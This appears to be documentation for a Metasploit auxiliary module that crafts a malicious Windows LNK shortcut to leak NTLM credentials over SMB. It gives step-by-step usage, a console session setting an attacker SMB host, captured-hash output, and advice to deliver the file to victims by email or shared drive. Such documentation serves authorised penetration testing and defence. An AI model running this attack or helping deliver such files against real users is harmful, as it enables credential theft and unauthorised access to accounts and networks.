## Vulnerable Application

Windows operating systems that process LNK files via Explorer, particularly when browsing directories containing the malicious shortcut.
This can lead to NTLM credential leaks over SMB.

References:
- [Right-Click LNK](https://zeifan.my/Right-Click-LNK/)
- [Exploit-DB 42382](https://www.exploit-db.com/exploits/42382)

Disclosure Date: 2025-05-10 (reported to MSRC).

## Verification Steps

1. Start msfconsole.
2. Load the module: `use auxiliary/fileformat/specialfolderdatablock_lnk`.
3. Customize options as needed (e.g., set FILENAME or APPNAME).
4. Execute the module: `run`.
5. A malicious LNK file will be generated.
6. If not using a custom UNCPATH, the module starts an SMB capture server automatically.
7. Place the LNK file in a directory on the target system.
8. Browse to the directory in Windows Explorer to trigger the SMB connection.
9. Monitor the console for captured NTLM hashes.

## Options

### APPNAME

Sets the display name of the application in the LNK file. If empty, a random name is generated.

Example:
```
set APPNAME FakeApp
```


## Scenarios

### Basic NTLM Hash Capture on Windows

Target: A Windows system with Explorer (e.g., Windows 10 or later).

Attacker: Use the module to generate the LNK and capture hashes locally.

```
msf > use auxiliary/fileformat/specialfolderdatablock_lnk
msf auxiliary(fileformat/specialfolderdatablock_lnk) > set FILENAME malicious.lnk
FILENAME => malicious.lnk
msf auxiliary(fileformat/specialfolderdatablock_lnk) > set SRVHOST 192.168.1.25
SRVHOST => 192.168.1.25
msf auxiliary(fileformat/specialfolderdatablock_lnk) > set APPNAME FakeApp
APPNAME => FakeApp
msf auxiliary(fileformat/specialfolderdatablock_lnk) > run

[*] Starting SMB server on 192.168.1.25:445
[*] Generating malicious LNK file
[+] malicious.lnk stored at /root/.msf4/local/malicious.lnk
[*] Listening for hashes on 192.168.1.25:445
[*] Auxiliary module execution completed
```

Deliver the `malicious.lnk` file to the target (e.g., via email or shared drive).
When the victim opens the containing folder in Explorer, an SMB connection is attempted:

```
[*] SMB Captured - 2025-09-18 21:03:00 +0530
NTLMv2 Response Captured from 192.168.1.50:49180 - 192.168.1.50
USER:targetuser DOMAIN:TARGETPC OS: Windows 10 LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:examplehashvalue
NT_CLIENT_CHALLENGE:examplechallenge
```
